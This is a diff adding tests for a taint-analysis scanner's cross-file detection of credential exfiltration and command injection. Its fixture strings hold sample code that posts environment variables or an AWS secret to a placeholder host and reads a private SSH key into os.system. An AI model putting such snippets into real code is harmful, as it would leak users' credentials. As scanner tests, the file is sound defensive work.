@@ -153,6 +153,58 @@ def test_install_hook_detected_in_packaging_context():
     assert any(f.pattern == "INSTALL_HOOK" for f in analyze(code).findings)
 
 
+# --- cross-file interprocedural taint -------------------------------------- #
+def test_cross_file_exfiltration_detected():
+    from taint import analyze_package
+    pkg = {
+        "utils.py": "import os\ndef grab():\n    return os.environ\n",
+        "client.py": "import requests\nfrom utils import grab\n"
+                     "def go():\n    requests.post('https://e', data=grab())\n",
+    }
+    fs = analyze_package(pkg)
+    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in fs)
+    assert fs[0].artifact_uri == "client.py"
+
+
+def test_cross_file_two_hop_chain():
+    from taint import analyze_package
+    pkg = {
+        "a.py": "import os\ndef a():\n    return os.getenv('AWS_SECRET')\n",
+        "b.py": "from a import a\ndef b():\n    return a()\n",
+        "c.py": "import requests\nfrom b import b\n"
+                "def go():\n    x = b()\n    requests.post('https://e', json=x)\n",
+    }
+    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze_package(pkg))
+
+
+def test_cross_file_ssh_key_to_exec():
+    from taint import analyze_package
+    pkg = {
+        "h.py": "def read_key():\n    return open('/home/u/.ssh/id_rsa').read()\n",
+        "m.py": "from h import read_key\nimport os\ndef run():\n    os.system(read_key())\n",
+    }
+    assert any(f.pattern == "COMMAND_INJECTION" for f in analyze_package(pkg))
+
+
+def test_cross_file_benign_upload_is_clean():
+    from taint import analyze_package
+    pkg = {
+        "u.py": "def load():\n    return open('report.csv').read()\n",
+        "c.py": "import requests\nfrom u import load\n"
+                "def go():\n    requests.post('https://e', data=load())\n",
+    }
+    assert analyze_package(pkg) == []
+
+
+def test_cross_file_local_secret_use_is_clean():
+    from taint import analyze_package
+    pkg = {
+        "u.py": "import os\ndef cfg():\n    return os.environ.get('DB')\n",
+        "c.py": "from u import cfg\ndef go():\n    db = cfg()\n    print(len(db))\n",
+    }
+    assert analyze_package(pkg) == []
+
+
 # --- false-positive fixes -------------------------------------------------- #
 def test_flask_app_run_is_not_a_sink():
     # app.run() must NOT be flagged as subprocess.run (receiver-aware matching)
